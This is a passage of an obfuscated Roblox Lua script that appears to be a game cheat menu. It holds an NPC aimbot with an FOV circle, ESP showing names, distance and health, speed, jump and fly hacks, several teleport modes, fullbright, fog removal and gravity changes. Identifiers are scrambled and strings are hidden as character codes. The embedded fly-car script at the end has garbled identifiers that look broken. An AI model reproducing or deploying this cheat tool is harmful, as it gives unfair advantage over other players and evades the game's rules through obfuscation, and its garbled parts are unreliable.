            local 敊祤斕端竽悬岍潆 = 矫蟪仠埚窗縈舧粓.Character:FindFirstChild(utf8.char(72, 101, 97, 100))
            if 敊祤斕端竽悬岍潆 then
                -- 平滑移动摄像机朝向目标头部
                local 鬮頳觃甂牉麓宰徺 = CFrame.new(歮埡诘揶蛄蘵洽愳.CFrame.Position, 敊祤斕端竽悬岍潆.Position)
                歮埡诘揶蛄蘵洽愳.CFrame = 歮埡诘揶蛄蘵洽愳.CFrame:Lerp(鬮頳觃甂牉麓宰徺, 0.15)
            end
        end

        -- 更新 FOV 圆圈大小
        if 逬貋祝臞噫檿轓谼.ShowFOV then
            local 宨树纉絉籲頩塾譜 = game:GetService(utf8.char(67, 111, 114, 101, 71, 117, 105)):FindFirstChild(utf8.char(65, 105, 109, 98, 111, 116, 70, 79, 86))
            if 宨树纉絉籲頩塾譜 then
                local 櫨鶻氉痌狭筵隆犪 = 宨树纉絉籲頩塾譜:FindFirstChild(utf8.char(67, 105, 114, 99, 108, 101))
                if 櫨鶻氉痌狭筵隆犪 then
                    local 貅唗峇骴阔忐侽应 = 逬貋祝臞噫檿轓谼.AimbotFOV * 2
                    櫨鶻氉痌狭筵隆犪.Size = UDim2.new(0, 貅唗峇骴阔忐侽应, 0, 貅唗峇骴阔忐侽应)
                    櫨鶻氉痌狭筵隆犪.Position = UDim2.new(0.5, -貅唗峇骴阔忐侽应 / 2, 0.5, -貅唗峇骴阔忐侽应 / 2)
                end
            end
        end
    end)
end

local function 签蚕喟慺錝焬冿園()
    if 慞襭擳讴颹馽葆碲 then 慞襭擳讴颹馽葆碲:Disconnect() 慞襭擳讴颹馽葆碲 = nil end
    local 宨树纉絉籲頩塾譜 = game:GetService(utf8.char(67, 111, 114, 101, 71, 117, 105)):FindFirstChild(utf8.char(65, 105, 109, 98, 111, 116, 70, 79, 86))
    if 宨树纉絉籲頩塾譜 then 宨树纉絉籲頩塾譜:Destroy() end
end

--========================================================
-- NPC 自瞄 & NPC 子追
--========================================================
local 郒帼揘皨凭強奈欽 = nil

-- 获取所有玩家角色的引用集合
local function 癠藧鎖悙蔕鏭淣狇()
    local 玥唊搵褫哇擌湠跩 = {}
    for _, p in ipairs(雺咯尩面固牑蓪梧:GetPlayers()) do
        if p.Character then 玥唊搵褫哇擌湠跩[p.Character] = true end
    end
    return 玥唊搵褫哇擌湠跩
end

-- 获取 NPC 列表 (榽拰繶篘瓙骻匠胳 中有 Humanoid 的非玩家模型)
local function 畭亃彆嘫麪淀材沋()
    local 坸飭廲楍鬇騇冩氾 = {}
    local 橈罸煵鲬播揂鐚璴 = 癠藧鎖悙蔕鏭淣狇()
    for _, 竸偂苎潕废罱椉襧 in ipairs(榽拰繶篘瓙骻匠胳:GetDescendants()) do
        if 竸偂苎潕废罱椉襧:IsA(utf8.char(77, 111, 100, 101, 108)) and not 橈罸煵鲬播揂鐚璴[竸偂苎潕废罱椉襧] then
            local 绠瘳饀秥鐏檶籅尨 = 竸偂苎潕废罱椉襧:FindFirstChildOfClass(utf8.char(72, 117, 109, 97, 110, 111, 105, 100))
            local 找坍絹鯻拫敾闋祟 = 竸偂苎潕废罱椉襧:FindFirstChild(utf8.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116)) or 竸偂苎潕废罱椉襧:FindFirstChild(utf8.char(84, 111, 114, 115, 111)) or 竸偂苎潕废罱椉襧:FindFirstChild(utf8.char(85, 112, 112, 101, 114, 84, 111, 114, 115, 111))
            if 绠瘳饀秥鐏檶籅尨 and 找坍絹鯻拫敾闋祟 and 绠瘳饀秥鐏檶籅尨.Health > 0 then
                table.insert(坸飭廲楍鬇騇冩氾, 竸偂苎潕废罱椉襧.Name)
            end
        end
    end
    return 坸飭廲楍鬇騇冩氾
end

-- 按名称找到第一个存活的 NPC 模型
local function 滚虓鍷損慞嗽锺布(曟諭郞恬夛塮頻秐)
    local 橈罸煵鲬播揂鐚璴 = 癠藧鎖悙蔕鏭淣狇()
    for _, 竸偂苎潕废罱椉襧 in ipairs(榽拰繶篘瓙骻匠胳:GetDescendants()) do
        if 竸偂苎潕废罱椉襧:IsA(utf8.char(77, 111, 100, 101, 108)) and not 橈罸煵鲬播揂鐚璴[竸偂苎潕废罱椉襧] and 竸偂苎潕废罱椉襧.Name == 曟諭郞恬夛塮頻秐 then
            local 绠瘳饀秥鐏檶籅尨 = 竸偂苎潕废罱椉襧:FindFirstChildOfClass(utf8.char(72, 117, 109, 97, 110, 111, 105, 100))
            local 找坍絹鯻拫敾闋祟 = 竸偂苎潕废罱椉襧:FindFirstChild(utf8.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116)) or 竸偂苎潕废罱椉襧:FindFirstChild(utf8.char(84, 111, 114, 115, 111)) or 竸偂苎潕废罱椉襧:FindFirstChild(utf8.char(85, 112, 112, 101, 114, 84, 111, 114, 115, 111))
            if 绠瘳饀秥鐏檶籅尨 and 找坍絹鯻拫敾闋祟 and 绠瘳饀秥鐏檶籅尨.Health > 0 then
                return 竸偂苎潕废罱椉襧
            end
        end
    end
    return nil
end

-- 获取屏幕中心 FOV 范围内最近的 NPC
local function 姱鰣粼撸梳侙璍銏()
    local 拂紋牒蠿秊拊碿渨 = nil
    local 脺乸欓媝壌矀囍事 = 逬貋祝臞噫檿轓谼.AimbotFOV
    local 眾塂燗鎌孾涞戞曩 = Vector2.new(歮埡诘揶蛄蘵洽愳.ViewportSize.X / 2, 歮埡诘揶蛄蘵洽愳.ViewportSize.Y / 2)
    local 橈罸煵鲬播揂鐚璴 = 癠藧鎖悙蔕鏭淣狇()
    for _, 竸偂苎潕废罱椉襧 in ipairs(榽拰繶篘瓙骻匠胳:GetDescendants()) do
        if 竸偂苎潕废罱椉襧:IsA(utf8.char(77, 111, 100, 101, 108)) and not 橈罸煵鲬播揂鐚璴[竸偂苎潕废罱椉襧] then
            local 绠瘳饀秥鐏檶籅尨 = 竸偂苎潕废罱椉襧:FindFirstChildOfClass(utf8.char(72, 117, 109, 97, 110, 111, 105, 100))
            local 敊祤斕端竽悬岍潆 = 竸偂苎潕废罱椉襧:FindFirstChild(utf8.char(72, 101, 97, 100))
            if 绠瘳饀秥鐏檶籅尨 and 敊祤斕端竽悬岍潆 and 绠瘳饀秥鐏檶籅尨.Health > 0 then
                local 嵇鵛闉嵫阒噤返踝, onScreen = 歮埡诘揶蛄蘵洽愳:WorldToViewportPoint(敊祤斕端竽悬岍潆.Position)
                if onScreen then
                    local 鷖霪庡垾軘敟吰牘 = (Vector2.new(嵇鵛闉嵫阒噤返踝.X, 嵇鵛闉嵫阒噤返踝.Y) - 眾塂燗鎌孾涞戞曩).Magnitude
                    if 鷖霪庡垾軘敟吰牘 < 脺乸欓媝壌矀囍事 then
                        脺乸欓媝壌矀囍事 = 鷖霪庡垾軘敟吰牘
                        拂紋牒蠿秊拊碿渨 = 竸偂苎潕废罱椉襧
                    end
                end
            end
        end
    end
    return 拂紋牒蠿秊拊碿渨
end

local function 荌簦粊呗钩觹穝莐()
    郒帼揘皨凭強奈欽 = 犄瞕炿詑碐糡圃曎.RenderStepped:Connect(function()
        if not 逬貋祝臞噫檿轓谼.NpcAimbot then return end
        local 征掜燀轩馂讵塜鑗 = true
        if 逬貋祝臞噫檿轓谼.AimbotKey then
            征掜燀轩馂讵塜鑗 = 氟崹攻鏗覻蟭胺跌:IsMouseButtonPressed(Enum.UserInputType.MouseButton2)
        end
        if not 征掜燀轩馂讵塜鑗 then return end
        local 矫蟪仠埚窗縈舧粓 = 姱鰣粼撸梳侙璍銏()
        if 矫蟪仠埚窗縈舧粓 then
            local 敊祤斕端竽悬岍潆 = 矫蟪仠埚窗縈舧粓:FindFirstChild(utf8.char(72, 101, 97, 100))
            if 敊祤斕端竽悬岍潆 then
                local 鬮頳觃甂牉麓宰徺 = CFrame.new(歮埡诘揶蛄蘵洽愳.CFrame.Position, 敊祤斕端竽悬岍潆.Position)
                歮埡诘揶蛄蘵洽愳.CFrame = 歮埡诘揶蛄蘵洽愳.CFrame:Lerp(鬮頳觃甂牉麓宰徺, 0.15)
            end
        end
    end)
end

local function 柺權漉訸肯捏摔扟()
    if 郒帼揘皨凭強奈欽 then 郒帼揘皨凭強奈欽:Disconnect() 郒帼揘皨凭強奈欽 = nil end
end

--========================================================
-- 创建窗口
--========================================================
local 瀣梃羢鹟夠伪誥璲 = WindUI:CreateWindow({
    Title = utf8.char(115, 98, 114, 112, 33050, 26412),
    Icon = utf8.char(115, 112, 97, 114, 107, 108, 101, 115),
    Folder = utf8.char(83, 104, 101, 110, 66, 117, 82, 117, 80, 105, 110, 103),
    HideSearchBar = true,
})

--========================================================
-- 彩虹边框动画
--========================================================
local 葋薸炡渜席煓掬鱼 = {}
local function 语誾浈竑鴓友唂暾()
    -- 查找 WindUI 主窗口 桊壱蠉椅徧鶶鵵鏲
    local function 忼鹺弭椇敖鰭棦祴()
        -- 在 PlayerGui 和 CoreGui 中搜索
        local 厄暟摚艄踠袡骸鲰 = {}
        if 憇菝龚描畒詃曒砤:FindFirstChild(utf8.char(80, 108, 97, 121, 101, 114, 71, 117, 105)) then
            for _, g in ipairs(憇菝龚描畒詃曒砤.PlayerGui:GetChildren()) do
                if g:IsA(utf8.char(83, 99, 114, 101, 101, 110, 71, 117, 105)) then table.insert(厄暟摚艄踠袡骸鲰, g) end
            end
        end
        local 罆襈出芋軷暗堘涃 = game:GetService(utf8.char(67, 111, 114, 101, 71, 117, 105))
        for _, g in ipairs(罆襈出芋軷暗堘涃:GetChildren()) do
            if g:IsA(utf8.char(83, 99, 114, 101, 101, 110, 71, 117, 105)) then table.insert(厄暟摚艄踠袡骸鲰, g) end
        end

        for _, 宨树纉絉籲頩塾譜 in ipairs(厄暟摚艄踠袡骸鲰) do
            for _, frame in ipairs(宨树纉絉籲頩塾譜:GetDescendants()) do
                if frame:IsA(utf8.char(70, 114, 97, 109, 101)) and frame.Name == utf8.char(87, 105, 110, 100, 111, 119) then
                    return frame
                end
            end
        end
        -- 备选：查找最大的 桊壱蠉椅徧鶶鵵鏲
        local 绁鰕嫍黦倱媝漺访 = nil
        local 拝硻尴赶铒銵缿流 = 0
        for _, 宨树纉絉籲頩塾譜 in ipairs(厄暟摚艄踠袡骸鲰) do
            for _, frame in ipairs(宨树纉絉籲頩塾譜:GetDescendants()) do
                if frame:IsA(utf8.char(70, 114, 97, 109, 101)) and frame.Parent and frame.Parent:IsA(utf8.char(83, 99, 114, 101, 101, 110, 71, 117, 105)) then
                    local 軳牳嶛紒軙匎炣檟 = frame.AbsoluteSize.X * frame.AbsoluteSize.Y
                    if 軳牳嶛紒軙匎炣檟 > 拝硻尴赶铒銵缿流 then
                        拝硻尴赶铒銵缿流 = 軳牳嶛紒軙匎炣檟
                        绁鰕嫍黦倱媝漺访 = frame
                    end
                end
            end
        end
        return 绁鰕嫍黦倱媝漺访
    end

    -- 延迟一帧查找（等 WindUI 完全渲染）
    task.defer(function()
        local 牿嵈殐憒荜柎圧羙 = 忼鹺弭椇敖鰭棦祴()
        if not 牿嵈殐憒荜柎圧羙 then
            task.wait(1)
            牿嵈殐憒荜柎圧羙 = 忼鹺弭椇敖鰭棦祴()
        end
        if not 牿嵈殐憒荜柎圧羙 then return end

        -- 创建外层彩虹边框 (UIStroke + UIGradient)
        local 痆魾醆臅酤縅齟捎 = Instance.new(utf8.char(85, 73, 83, 116, 114, 111, 107, 101))
        痆魾醆臅酤縅齟捎.Name = utf8.char(82, 97, 105, 110, 98, 111, 119, 83, 116, 114, 111, 107, 101, 79, 117, 116, 101, 114)
        痆魾醆臅酤縅齟捎.Thickness = 4
        痆魾醆臅酤縅齟捎.Transparency = 0.1
        痆魾醆臅酤縅齟捎.Parent = 牿嵈殐憒荜柎圧羙

        local 焙摝猑澠拝剱鑸昕 = Instance.new(utf8.char(85, 73, 71, 114, 97, 100, 105, 101, 110, 116))
        焙摝猑澠拝剱鑸昕.Name = utf8.char(82, 97, 105, 110, 98, 111, 119, 71, 114, 97, 100, 105, 101, 110, 116)
        焙摝猑澠拝剱鑸昕.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)),
            ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 127, 0)),
            ColorSequenceKeypoint.new(0.33, Color3.fromRGB(255, 255, 0)),
            ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 255, 0)),
            ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 170, 255)),
            ColorSequenceKeypoint.new(0.83, Color3.fromRGB(75, 0, 130)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 255)),
        })
        焙摝猑澠拝剱鑸昕.Rotation = 0
        焙摝猑澠拝剱鑸昕.Parent = 痆魾醆臅酤縅齟捎

        -- 创建内层彩虹边框
        local 鹖艜鲢鳠襡篨蛓迻 = Instance.new(utf8.char(85, 73, 83, 116, 114, 111, 107, 101))
        鹖艜鲢鳠襡篨蛓迻.Name = utf8.char(82, 97, 105, 110, 98, 111, 119, 83, 116, 114, 111, 107, 101, 73, 110, 110, 101, 114)
        鹖艜鲢鳠襡篨蛓迻.Thickness = 2
        鹖艜鲢鳠襡篨蛓迻.Transparency = 0.3
        鹖艜鲢鳠襡篨蛓迻.Parent = 牿嵈殐憒荜柎圧羙

        local 芹兆峠剴綏鞗儥姯 = Instance.new(utf8.char(85, 73, 71, 114, 97, 100, 105, 101, 110, 116))
        芹兆峠剴綏鞗儥姯.Name = utf8.char(82, 97, 105, 110, 98, 111, 119, 71, 114, 97, 100, 105, 101, 110, 116, 50)
        芹兆峠剴綏鞗儥姯.Color = 焙摝猑澠拝剱鑸昕.Color
        芹兆峠剴綏鞗儥姯.Rotation = 180
        芹兆峠剴綏鞗儥姯.Parent = 鹖艜鲢鳠襡篨蛓迻

        -- 创建四个边的彩色条纹 (上下左右)
        local 铹鏝频舨櫬纔佫揮 = {}
        local 隒垡脛矦颧佳娕圡 = {utf8.char(84, 111, 112), utf8.char(66, 111, 116, 116, 111, 109), utf8.char(76, 101, 102, 116), utf8.char(82, 105, 103, 104, 116)}
        for _, pos in ipairs(隒垡脛矦颧佳娕圡) do
            local 訹朢擰价葏笻蹽鿗 = Instance.new(utf8.char(70, 114, 97, 109, 101))
            訹朢擰价葏笻蹽鿗.Name = utf8.char(82, 97, 105, 110, 98, 111, 119, 83, 116, 114, 105, 112, 101, 95) .. pos
            訹朢擰价葏笻蹽鿗.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            訹朢擰价葏笻蹽鿗.BorderSizePixel = 0
            訹朢擰价葏笻蹽鿗.ZIndex = 10

            local 蓭踴姹蠪崷餽澁舮 = Instance.new(utf8.char(85, 73, 71, 114, 97, 100, 105, 101, 110, 116))
            蓭踴姹蠪崷餽澁舮.Name = utf8.char(71, 114, 97, 100)
            蓭踴姹蠪崷餽澁舮.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)),
                ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 127, 0)),
                ColorSequenceKeypoint.new(0.33, Color3.fromRGB(255, 255, 0)),
                ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 255, 0)),
                ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 170, 255)),
                ColorSequenceKeypoint.new(0.83, Color3.fromRGB(75, 0, 130)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 255)),
            })
            蓭踴姹蠪崷餽澁舮.Parent = 訹朢擰价葏笻蹽鿗

            if pos == utf8.char(84, 111, 112) then
                訹朢擰价葏笻蹽鿗.Size = UDim2.new(1, 0, 0, 3)
                訹朢擰价葏笻蹽鿗.Position = UDim2.new(0, 0, 0, -3)
            elseif pos == utf8.char(66, 111, 116, 116, 111, 109) then
                訹朢擰价葏笻蹽鿗.Size = UDim2.new(1, 0, 0, 3)
                訹朢擰价葏笻蹽鿗.Position = UDim2.new(0, 0, 1, 0)
            elseif pos == utf8.char(76, 101, 102, 116) then
                訹朢擰价葏笻蹽鿗.Size = UDim2.new(0, 3, 1, 0)
                訹朢擰价葏笻蹽鿗.Position = UDim2.new(0, -3, 0, 0)
            elseif pos == utf8.char(82, 105, 103, 104, 116) then
                訹朢擰价葏笻蹽鿗.Size = UDim2.new(0, 3, 1, 0)
                訹朢擰价葏笻蹽鿗.Position = UDim2.new(1, 0, 0, 0)
            end

            訹朢擰价葏笻蹽鿗.Parent = 牿嵈殐憒荜柎圧羙
            table.insert(铹鏝频舨櫬纔佫揮, {frame = 訹朢擰价葏笻蹽鿗, grad = 蓭踴姹蠪崷餽澁舮, pos = pos})
        end

        -- 动画：旋转渐变颜色
        local 趸祝鮗鯷翸柧淺餼 = 0
        local 犋其蒍遐歕熨菓碟 = 180
        local 夝磖龿洲鞒霯醋哿 = {0, 90, 0, 90}
        local 淗餲鬑儔唿畢廊佲 = 犄瞕炿詑碐糡圃曎.RenderStepped:Connect(function(dt)
            趸祝鮗鯷翸柧淺餼 = (趸祝鮗鯷翸柧淺餼 + 60 * dt) % 360
            犋其蒍遐歕熨菓碟 = (犋其蒍遐歕熨菓碟 - 60 * dt) % 360
            焙摝猑澠拝剱鑸昕.Rotation = 趸祝鮗鯷翸柧淺餼
            芹兆峠剴綏鞗儥姯.Rotation = 犋其蒍遐歕熨菓碟

            for i, s in ipairs(铹鏝频舨櫬纔佫揮) do
                s.grad.Rotation = (s.grad.Rotation + (50 + i * 10) * dt) % 360
            end
        end)
        table.insert(葋薸炡渜席煓掬鱼, 淗餲鬑儔唿畢廊佲)
    end)
end

语誾浈竑鴓友唂暾()

--========================================================
-- Tab1: 角色
--========================================================
local 原錖铅衻缄槢踀歊 = 瀣梃羢鹟夠伪誥璲:Tab({Title = utf8.char(35282, 33394), Icon = utf8.char(117, 115, 101, 114)})

原錖铅衻缄槢踀歊:Slider({
    Title = utf8.char(34892, 36208, 36895, 24230),
    Value = {Min = 16, Max = 500, Default = 16},
    Step = 1,
    Callback = function(val) 逬貋祝臞噫檿轓谼.WalkSpeed = val 迆周袱燚讵歀俜狛() end,
})

原錖铅衻缄槢踀歊:Slider({
    Title = utf8.char(36339, 36291, 21147, 24230),
    Value = {Min = 50, Max = 500, Default = 50},
    Step = 1,
    Callback = function(val) 逬貋祝臞噫檿轓谼.JumpPower = val 嗇閃膩跭廧撽腑嗢() end,
})

原錖铅衻缄槢踀歊:Button({
    Title = utf8.char(37325, 32622, 31227, 21160),
    Callback = function()
        逬貋祝臞噫檿轓谼.WalkSpeed = 16 逬貋祝臞噫檿轓谼.JumpPower = 50
        迆周袱燚讵歀俜狛() 嗇閃膩跭廧撽腑嗢()
    end,
})

原錖铅衻缄槢踀歊:Divider()

原錖铅衻缄槢踀歊:Toggle({
    Title = utf8.char(39134, 34892, 32, 40, 24320, 21551, 21518, 24377, 20986, 39134, 34892, 38754, 26495, 41),
    Default = false,
    Callback = function(val)
        if val then 虢挄亴肛餕崐别悴() else 酆鏱粼旅隶躲蒹鄞() end
    end,
})

原錖铅衻缄槢踀歊:Divider()

原錖铅衻缄槢踀歊:Button({
    Title = utf8.char(31435, 21363, 37325, 29983),
    Callback = function()
        local 莶踯猇淪怩坘蕪难 = 肭家薊屓憍擤榎傯() if 莶踯猇淪怩坘蕪难 then 莶踯猇淪怩坘蕪难.Health = 0 end
    end,
})

--========================================================
-- Tab2: 传送
--========================================================
local 枡球黨袑鎓栀乾鄪 = 瀣梃羢鹟夠伪誥璲:Tab({Title = utf8.char(20256, 36865), Icon = utf8.char(109, 97, 112, 45, 112, 105, 110)})

local 膰羺籰虘怾侸蘮卨 = nil
local 舕隁疳鼤扖瘎玢攷 = 枡球黨袑鎓栀乾鄪:Dropdown({
    Title = utf8.char(36873, 25321, 29609, 23478),
    Values = 牂褫拮迱愽办擈樫(),
    Callback = function(val) 膰羺籰虘怾侸蘮卨 = val end,
})

枡球黨袑鎓栀乾鄪:Button({
    Title = utf8.char(20256, 36865, 21040, 35813, 29609, 23478),
    Callback = function()
        if not 膰羺籰虘怾侸蘮卨 then 熱喫盥嫚杮歡傱萌(utf8.char(26410, 36873, 25321), utf8.char(), 3) return end
        local 撧錬熲捔駇枯溉识 = 雺咯尩面固牑蓪梧:FindFirstChild(膰羺籰虘怾侸蘮卨)
        if 撧錬熲捔駇枯溉识 and 撧錬熲捔駇枯溉识.Character and 撧錬熲捔駇枯溉识.Character:FindFirstChild(utf8.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116)) then
            local 捆郹賾曱怓凚湒炿 = 葰疀嗂枥訷薠蕠龵()
            if 捆郹賾曱怓凚湒炿 then 捆郹賾曱怓凚湒炿.CFrame = 撧錬熲捔駇枯溉识.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0) end
        else 熱喫盥嫚杮歡傱萌(utf8.char(22833, 36133), utf8.char(30446, 26631, 19981, 21487, 29992), 3) end
    end,
})

枡球黨袑鎓栀乾鄪:Button({
    Title = utf8.char(21047, 26032, 21015, 34920),
    Callback = function()
        if 舕隁疳鼤扖瘎玢攷 then pcall(function() 舕隁疳鼤扖瘎玢攷:Refresh(牂褫拮迱愽办擈樫()) end) end
    end,
})

枡球黨袑鎓栀乾鄪:Divider()

local 姤槓諓坏涧柤銜炁, cy, cz = 0, 0, 0
枡球黨袑鎓栀乾鄪:Input({Title = utf8.char(88), Callback = function(v) 姤槓諓坏涧柤銜炁 = tonumber(v) or 0 end})
枡球黨袑鎓栀乾鄪:Input({Title = utf8.char(89), Callback = function(v) cy = tonumber(v) or 0 end})
枡球黨袑鎓栀乾鄪:Input({Title = utf8.char(90), Callback = function(v) cz = tonumber(v) or 0 end})

枡球黨袑鎓栀乾鄪:Button({
    Title = utf8.char(20256, 36865, 21040, 22352, 26631),
    Callback = function()
        local 捆郹賾曱怓凚湒炿 = 葰疀嗂枥訷薠蕠龵()
        if 捆郹賾曱怓凚湒炿 then 捆郹賾曱怓凚湒炿.CFrame = CFrame.new(姤槓諓坏涧柤銜炁, cy, cz) end
    end,
})

枡球黨袑鎓栀乾鄪:Button({
    Title = utf8.char(20256, 36865, 21040, 20986, 29983, 28857),
    Callback = function()
        for _, v in ipairs(榽拰繶篘瓙骻匠胳:GetDescendants()) do
            if v:IsA(utf8.char(83, 112, 97, 119, 110, 76, 111, 99, 97, 116, 105, 111, 110)) then
                local 捆郹賾曱怓凚湒炿 = 葰疀嗂枥訷薠蕠龵()
                if 捆郹賾曱怓凚湒炿 then 捆郹賾曱怓凚湒炿.CFrame = v.CFrame + Vector3.new(0, 3, 0) end
                return
            end
        end
        熱喫盥嫚杮歡傱萌(utf8.char(22833, 36133), utf8.char(26410, 25214, 21040, 20986, 29983, 28857), 3)
    end,
})

枡球黨袑鎓栀乾鄪:Divider()

-- 点击传送 (工具栏道具)
local 仪鵄畈燝萷丫哵褲 = nil
local 牾聜耆晡飼蓛锽折 = nil
枡球黨袑鎓栀乾鄪:Toggle({
    Title = utf8.char(28857, 20987, 20256, 36865, 32, 40, 35013, 22791, 36947, 20855, 21518, 28857, 20987, 22320, 38754, 41),
    Default = false,
    Callback = function(val)
        if val then
            -- 创建传送工具
            仪鵄畈燝萷丫哵褲 = Instance.new(utf8.char(84, 111, 111, 108))
            仪鵄畈燝萷丫哵褲.Name = utf8.char(28857, 20987, 20256, 36865)
            仪鵄畈燝萷丫哵褲.ToolTip = utf8.char(35013, 22791, 21518, 28857, 20987, 20219, 24847, 20301, 32622, 20256, 36865)
            仪鵄畈燝萷丫哵褲.RequiresHandle = false
            仪鵄畈燝萷丫哵褲.CanBeDropped = false
            仪鵄畈燝萷丫哵褲.Parent = 憇菝龚描畒詃曒砤:WaitForChild(utf8.char(66, 97, 99, 107, 112, 97, 99, 107))

            牾聜耆晡飼蓛锽折 = 仪鵄畈燝萷丫哵褲.Activated:Connect(function()
                local 炰氈椣吱豪痒骕聵 = 憇菝龚描畒詃曒砤:GetMouse()
                local 捆郹賾曱怓凚湒炿 = 葰疀嗂枥訷薠蕠龵()
                if 捆郹賾曱怓凚湒炿 and 炰氈椣吱豪痒骕聵.Hit then
                    捆郹賾曱怓凚湒炿.CFrame = CFrame.new(炰氈椣吱豪痒骕聵.Hit.Position + Vector3.new(0, 3, 0))
                end
            end)
            熱喫盥嫚杮歡傱萌(utf8.char(28857, 20987, 20256, 36865), utf8.char(24050, 28155, 21152, 36947, 20855, 21040, 29289, 21697, 26639, 65292, 35013, 22791, 21518, 28857, 20987, 20219, 24847, 20301, 32622, 20256, 36865), 4)
        else
            if 牾聜耆晡飼蓛锽折 then 牾聜耆晡飼蓛锽折:Disconnect() 牾聜耆晡飼蓛锽折 = nil end
            if 仪鵄畈燝萷丫哵褲 then
                -- 从背包和角色中移除
                if 仪鵄畈燝萷丫哵褲.Parent then 仪鵄畈燝萷丫哵褲:Destroy() end
                仪鵄畈燝萷丫哵褲 = nil
            end
            熱喫盥嫚杮歡傱萌(utf8.char(28857, 20987, 20256, 36865), utf8.char(24050, 20851, 38381), 3)
        end
    end,
})

--========================================================
-- Tab3: 视觉
--========================================================
local 棍窷遨炜洱嚴噛窐 = 瀣梃羢鹟夠伪誥璲:Tab({Title = utf8.char(35270, 35273), Icon = utf8.char(101, 121, 101)})

棍窷遨炜洱嚴噛窐:Toggle({
    Title = utf8.char(69, 83, 80, 32, 36879, 35270, 32, 40, 21517, 31216, 43, 36317, 31163, 43, 34880, 37327, 41),
    Default = false,
    Callback = function(val)
        逬貋祝臞噫檿轓谼.ESPEnabled = val
        if val then 龉兲訴麩飋蘢帶哪() end
        for _, 竸偂苎潕废罱椉襧 in pairs(橬詤缼便諶休墜毜) do
            if 竸偂苎潕废罱椉襧.桯癄朋聪鱄匂驠鿀 then 竸偂苎潕废罱椉襧.桯癄朋聪鱄匂驠鿀.Enabled = val end
            if 竸偂苎潕废罱椉襧.备谔譝崭轊楰蔐兆 then 竸偂苎潕废罱椉襧.备谔譝崭轊楰蔐兆.Enabled = val end
        end
    end,
})

棍窷遨炜洱嚴噛窐:Divider()

local 斟褥窣弸姨砸坫沲 = {}
棍窷遨炜洱嚴噛窐:Toggle({
    Title = utf8.char(20840, 20142),
    Default = false,
    Callback = function(val)
        if val then
            斟褥窣弸姨砸坫沲.B = 域鴋慟呧嵭輽鍅謀.Brightness
            斟褥窣弸姨砸坫沲.T = 域鴋慟呧嵭輽鍅謀.ClockTime
            斟褥窣弸姨砸坫沲.F = 域鴋慟呧嵭輽鍅謀.FogEnd
            斟褥窣弸姨砸坫沲.幚浻猝侽汔蒺覍類 = 域鴋慟呧嵭輽鍅謀.GlobalShadows
            域鴋慟呧嵭輽鍅謀.Brightness = 3
            域鴋慟呧嵭輽鍅謀.ClockTime = 12
            域鴋慟呧嵭輽鍅謀.FogEnd = 1e9
            域鴋慟呧嵭輽鍅謀.GlobalShadows = false
        else
            if 斟褥窣弸姨砸坫沲.B then 域鴋慟呧嵭輽鍅謀.Brightness = 斟褥窣弸姨砸坫沲.B end
            if 斟褥窣弸姨砸坫沲.T then 域鴋慟呧嵭輽鍅謀.ClockTime = 斟褥窣弸姨砸坫沲.T end
            if 斟褥窣弸姨砸坫沲.F then 域鴋慟呧嵭輽鍅謀.FogEnd = 斟褥窣弸姨砸坫沲.F end
            if 斟褥窣弸姨砸坫沲.幚浻猝侽汔蒺覍類 ~= nil then 域鴋慟呧嵭輽鍅謀.GlobalShadows = 斟褥窣弸姨砸坫沲.幚浻猝侽汔蒺覍類 end
        end
    end,
})

棍窷遨炜洱嚴噛窐:Slider({
    Title = utf8.char(35270, 37326, 32, 70, 79, 86),
    Value = {Min = 30, Max = 120, Default = 70},
    Step = 1,
    Callback = function(val) 歮埡诘揶蛄蘵洽愳.FieldOfView = val end,
})

棍窷遨炜洱嚴噛窐:Toggle({
    Title = utf8.char(31227, 38500, 38654, 25928),
    Default = false,
    Callback = function(val)
        if val then 域鴋慟呧嵭輽鍅謀.FogEnd = 1e9 域鴋慟呧嵭輽鍅謀.FogStart = 1e9
        else 域鴋慟呧嵭輽鍅謀.FogEnd = 100000 域鴋慟呧嵭輽鍅謀.FogStart = 0 end
    end,
})

--========================================================
-- Tab4: 世界 & 工具
--========================================================
local 唹暃宴镚腐黴匱澟 = 瀣梃羢鹟夠伪誥璲:Tab({Title = utf8.char(24037, 20855), Icon = utf8.char(119, 114, 101, 110, 99, 104)})

唹暃宴镚腐黴匱澟:Slider({
    Title = utf8.char(37325, 21147),
    Value = {Min = 0, Max = 500, Default = 196},
    Step = 1,
    Callback = function(val) 榽拰繶篘瓙骻匠胳.Gravity = val end,
})

唹暃宴镚腐黴匱澟:Button({
    Title = utf8.char(37325, 32622, 37325, 21147),
    Callback = function() 榽拰繶篘瓙骻匠胳.Gravity = 196.2 end,
})

-- 飞车脚本
local 裃屪洨蠊婐蹅碸崱 = [=[
	local 赚湂鬍盺忬腗綇膺 = 50

	local 肶鲨崩媯欀讋跞傶 = game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character.HumanoidRootPart

	local 诂湽牆刵犛琗冓鸐 = Instance.new(utf8.char(83, 99, 114, 101, 101, 110, 71, 117, 105))
	local 逷恚咺聅腬櫽褂璊 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))
	local 幚浻猝侽汔蒺覍類 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))
	local 蛕饇憊卛锒珊疢虱 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))
	local 磩軧嬚奲圅缰泍廓 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))
